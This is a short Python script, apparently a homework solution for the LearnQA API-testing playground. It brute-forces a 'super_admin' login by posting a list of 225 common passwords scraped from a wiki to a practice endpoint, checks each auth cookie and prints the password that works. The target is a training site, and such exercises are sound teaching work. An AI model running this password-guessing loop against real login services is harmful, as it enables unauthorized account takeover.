import requests
from get_password_from_wiki import get_psw_from_wiki

login = 'super_admin'
list_psw = get_psw_from_wiki() # 225 шт

i = 1
for psw in list_psw:
    print(i) # чтобы видеть прогресс во время выполнения скрипта
    parametrs = {"login": login, "password": psw}
    response = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=parametrs)
    # print(response.text)
    cookies = {}
    if response.cookies.get('auth_cookie') is not None:
        cookies.update({'auth_cookie': response.cookies.get('auth_cookie')})
        response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = cookies)
        resp = response2.text
        if resp == "You are authorized":
            # print(resp)
            print(f"Искомый пароль: {psw}")
            break
    i = i+1

